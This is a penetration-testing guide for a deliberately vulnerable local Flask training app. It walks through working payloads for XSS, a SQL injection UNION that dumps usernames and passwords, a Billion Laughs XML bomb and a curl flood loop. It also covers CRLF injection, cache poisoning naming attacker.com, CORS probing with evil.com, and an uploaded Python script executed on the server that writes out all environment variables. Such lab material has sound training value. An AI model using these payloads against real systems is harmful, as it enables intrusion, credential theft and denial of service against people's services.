# Tegh Industries - Comprehensive Penetration Testing Guide

**Target Application**: Tegh Industries (Defense & Logistics Platform)  
**URL**: `http://127.0.0.1:5000`  
**Architecture**: Flask (Python) Backend + SQLite + Custom CMS

This document provides a step-by-step walkthrough to identify and exploit the intentional vulnerabilities within the Tegh Industries platform.

---

## 1. Cross-Site Scripting (XSS)

### A. Reflected XSS (Server Error Reflection)
**Vulnerability Map**: The search API reflects user input in the error message when a system error occurs (e.g., SQL syntax error).
*   **Location**: `/api/search`
*   **Test Steps**:
    1.  Force an error by sending a payload that affects the backend logic (logic implemented in JS to render error).
    2.  Visit: `/api/search?q='`
    3.  The server returns 500. The frontend JS catches this and renders the `data.message` without sanitization.
    4.  Payload: `http://127.0.0.1:5000/api/search?q='<script>alert(1)</script>` (Note: Browser might encode this, use Burp or Repeater).

### B. Stored XSS (Field Notes / Contact)
**Vulnerability Map**: The "Field Notes" form in campaign details and the main Contact form accept input that is "weakly sanitzed" (removes exact `<script>` but fails on others) and reflected in a preview.
*   **Location**: `/contact` (POST)
*   **Test Steps**:
    1.  In any contact form (e.g., bottom of `/campaign/1`), enter `<img src=x onerror=alert('Stored')>`.
    2.  Click "Verify Entry" (Preview).
    3.  The application renders the preview raw: `<h1>NOTE PREVIEW</h1><hr><img src=x onerror=alert('Stored')>`
*   **Result**: Immediate execution of JS.

---

## 2. SQL Injection (SQLi)

**Vulnerability Map**: The Search API concatenates inputs directly into a SQLite query.
*   **Location**: Search Bar (`/api/search?q=`)
*   **Test Steps**:
    1.  **Test for Logic**: Enter `' OR '1'='1`. This returns ALL campaigns (including hidden ones where `is_public=1`).
    2.  **Data Extraction**:
        Enter: `' UNION SELECT 1,username,password,role,5,6,7,8,9 FROM users--`
    3.  **Observe**:
        The search results grid will display a "campaign" that is actually the admin user:
        *   **Title**: `admin`
        *   **Client**: `industrial_titan_99` (Password)
        *   **Budget**: `admin` (Role)

---

## 3. XML External Entity (XXE) / XML DoS
**Endpoint**: `/api/process_report` (POST)  
**Payload Type**: XML Body  
**Description**: The endpoint parses XML input insecurely using `xml.etree.ElementTree`. It is vulnerable to Entity Expansion (Billion Laughs Attack).  
**Attack Vector**:
*   **Payload (DoS)**:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     ...
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <report><id>DOS</id><content>&lol9;</content></report>
    ```
*   **Impact**: Server resource consumption (CPU/RAM) leading to crash or freeze.

---

## 4. Insecure Direct Object Reference (IDOR)

**Vulnerability Map**: Access controls are missing for viewing details of specific objects.
*   **Location**: `/campaign/<id>`
*   **Test Steps**:
    1.  Click on a valid project (e.g., ID 1). URL: `/campaign/1`.
    2.  Manually change the URL to `/campaign/4`.
    3.  Note: ID 4 is not listed in the public search results (it has `is_public=0`).
*   **Expected Result**: You successfully load the page for "Black Operations IV" and see the hidden content.

---

## 5. Application-Level Denial of Service (DoS)
**Endpoint**: `/contact` (POST)  
**Description**: The contact form processes messages with a deliberate `time.sleep(0.5)` delay and has no rate limiting.  
**Attack Vector**:
*   **Attack**: Send concurrent POST requests to `/contact` in a loop.
*   **Command**: `while true; do curl -X POST -F "message=dos" http://127.0.0.1:5000/contact & done`
*   **Result**: Thread pool exhaustion, making the site unresponsive.

---

## 6. Open Redirect
**Vulnerability Map**: The application redirects users to external URLs provided in the `url` parameter without validation.
*   **Location**: Footer Links (Privacy, Legal)
*   **Endpoint**: `/redirect?url=...`
*   **Example**: `http://127.0.0.1:5000/redirect?url=http://malicious-site.com`

---

## 7. CRLF Injection
**Endpoint**: `/api/track`  
**Parameter**: `source` (GET)  
**Description**: The `source` parameter is reflected into the header `X-Campaign-Source`.  
**Attack Vector**: `?source=email%0d%0aSet-Cookie: malicious=true`

---

## 8. Cache Poisoning
**Endpoint**: `/assets/analytics.js`  
**Description**: Builds base URL using `X-Forwarded-Host`.  
**Attack Vector**: `curl -H "X-Forwarded-Host: attacker.com" http://127.0.0.1:5000/assets/analytics.js`

---

## 9. Sensitive Information Disclosure
*   `/backups/` - Lists `db_backup.sql`.
*   `/.git/` - Returns git ref.
*   `/personnel` - Employee directory accessible via IDOR/Open logic (Logic allows listing all names/clearances).

---

## 10. CORS Misconfiguration
**Description**: Default `Access-Control-Allow-Origin` set to request origin.
**Test**: Send `Origin: evil.com`. Response mirrors it.

---

## 11. Remote Code Execution (RCE)
**Endpoint**: `/upload` (POST)  
**Vulnerability**: Insecure File Upload / Code Execution  
**Description**: The "System Update Uplink" feature auto-executes Python `.py` files for "patching" using the `exec()` function.
*   **Attack Vector**:
    1.  Create a file named `shell.py` with the following content:
        ```python
       import os
import platform
import datetime

print("[+] RCE Successful")
print("[+] Time:", datetime.datetime.now())
print("[+] User:", os.getuid() if hasattr(os, "getuid") else "windows")
print("[+] CWD:", os.getcwd())
print("[+] Platform:", platform.platform())

# Write proof file
with open("rce_proof.txt", "w") as f:
    f.write("RCE CONFIRMED\n")
    f.write(f"Time: {datetime.datetime.now()}\n")
    f.write(f"CWD: {os.getcwd()}\n")
    f.write(f"Env:\n")
    for k, v in os.environ.items():
        f.write(f"{k}={v}\n")

print("[+] Proof file written: rce_proof.txt")

        ```
    2.  Navigate to `/dashboard` > "Secure Transfer" (or go to `/upload`).
    3.  Upload `shell.py`.
*   **Result**: The server executes the Python code immediately. You will see "Script Executed Successfully" and the side-effects (like file creation) will be present on the server.
*   **Impact**: Full server compromise.

---

## 12. Secure Features Clarification
*   All other core business logic (auth, inventory listing, etc.) is primarily designed to demonstrate the cataloged vulnerabilities above.

